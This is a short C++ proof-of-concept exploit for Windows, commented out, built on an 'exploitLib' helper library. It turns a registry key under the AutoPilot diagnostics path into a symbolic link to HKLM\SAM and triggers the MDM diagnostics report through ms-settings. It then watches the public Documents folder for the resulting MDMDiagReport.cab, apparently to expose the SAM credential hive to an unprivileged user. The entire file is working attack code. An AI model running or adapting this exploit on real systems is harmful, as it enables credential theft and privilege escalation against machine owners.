/*#include <exploitLib/exploitLib.h>
 
using namespace x::literalNS;


int main(int, char* args[])
try
{
   try { x::regKey{ "\\registry\\MACHINE\\SOFTWARE\\Microsoft\\Provisioning\\Diagnostics\\AutoPilot\\a",false,DELETE }.deleteKey(); } catch(...){}
   x::createRegLinkKey{ "\\registry\\MACHINE\\SOFTWARE\\Microsoft\\Provisioning\\Diagnostics\\AutoPilot\\a" ,true }.setLinkDestination("\\registry\\MACHINE\\SAM");

   x::process::ShellExecuteW(L"ms-settings:workplace");
   x::file p{ "%public%\\documents"_p };
   auto yh=p.monitorFolderChanges(true, wil::FolderChangeEvents::All,
      [&](wil::FolderChangeEvent e, PCWSTR f) {
         if (std::wstring{ f } == L"MDMDiagnostics\\MDMDiagReport.cab"s )
            static auto once = (x::process::ShellExecuteW( "%public%\\documents\\MDMDiagnostics"_p ),true);
      }
   );
   getchar();
}
catch (wil::ResultException& e)
{
   std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
   std::wcout << e.what() << std::endl;
}
catch (std::exception& e)
{
   std::wcout << e.what() << std::endl;
} 
*/